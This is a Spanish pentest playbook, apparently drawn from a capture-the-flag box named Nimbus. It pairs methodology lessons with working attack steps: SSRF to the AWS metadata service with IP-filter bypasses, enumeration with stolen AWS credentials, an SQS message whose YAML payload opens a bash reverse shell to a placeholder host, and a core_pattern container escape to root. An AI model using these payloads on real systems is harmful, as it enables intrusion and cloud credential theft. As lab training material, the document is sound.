# 🎯 PLAYBOOK de Pentest — lecciones + metodología reusable
> Consultar SIEMPRE antes de empezar un box. Nace de errores REALES.

## ⚠️ META-REGLAS (de la cagada de Nimbus)
1. **ENUMERAR VHOSTS/SUBDOMINIOS SIEMPRE.** ← el error #1 de Nimbus.
   Encontré `nimbus.htb` pero NO fuzzeé subdominios → me perdí **`aws.nimbus.htb`** (AWS API directo) → me fui a un rabbit-hole de SSRF-a-STS con un filtro imposible. **El camino intended era un vhost directo que nunca busqué.**
   ```bash
   # baseline: curl -s -H "Host: nope.nimbus.htb" http://IP/ | wc -c   (para el -fs)
   ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
        -u http://IP/ -H "Host: FUZZ.nimbus.htb" -fs <baseline>
   ```
2. **No hacer TUNNEL-VISION.** Si un camino se vuelve imposible (filtro anti-relay, etc.) → señal de que **NO es el intended.** Volver a enumerar en vez de insistir.
3. **Enumeración amplia ANTES de explotar profundo:** ports → **vhosts** → dirs → params. El orden importa.
4. **Target no-determinista** = testear una request a la vez, espaciado. No rapid-fire (rompe apps single-threaded y da datos basura).

## ☁️ CLOUD / AWS (patrón Nimbus)
1. **SSRF → IMDS creds:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`
   Bypass filtro IP: octal `0251.0376.0251.0376` · decimal `2852039166` · corto `127.1`.
2. **AWS API expuesto** (vhost `aws.<domain>` → LocalStack :4566). Agregar a `/etc/hosts` y usar el CLI DIRECTO (firma SigV4 sola, sin SSRF ni filtro):
   ```bash
   export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
   AWS="aws --endpoint-url http://aws.nimbus.htb"
   $AWS sts get-caller-identity
   $AWS sqs list-queues ; $AWS s3 ls ; $AWS secretsmanager list-secrets ; $AWS lambda list-functions
   ```
3. **Explotar el servicio** (Nimbus = SQS → worker deserializa YAML inseguro → RCE):
   ```bash
   $AWS sqs send-message --queue-url http://aws.nimbus.htb/ACCT/nimbus-jobs \
     --message-body $'name: x\nscript: import os;os.system("bash -c \'bash -i >& /dev/tcp/MYIP/4444 0>&1\'")'
   ```
4. **LocalStack CodeBuild → root:** proyecto `privilegedMode:True`; bypass UID-drop con `BASH_FUNC_id%%=() { echo uid=1000; }`; escape con `core_pattern` usermode-helper (`echo "|$UDIR/x.sh" > /proc/sys/kernel/core_pattern` + crash → corre como root en el host).

## 🔑 Servicios AWS que SIEMPRE enumerar con creds robadas
`sts get-caller-identity` (quién soy) · `sqs list-queues` · `s3 ls` · `secretsmanager list-secrets` + `get-secret-value` · `ssm describe-parameters` · `lambda list-functions` · `iam list-roles`/`get-role-policy` (para AssumeRole a algo más gordo).

## 📚 Referencias (no reinventar)
HackTricks · PayloadsAllTheThings · **hackingthe.cloud** (AWS) · SecLists (`/usr/share/seclists`) · GTFOBins/LOLBAS · revshells.com
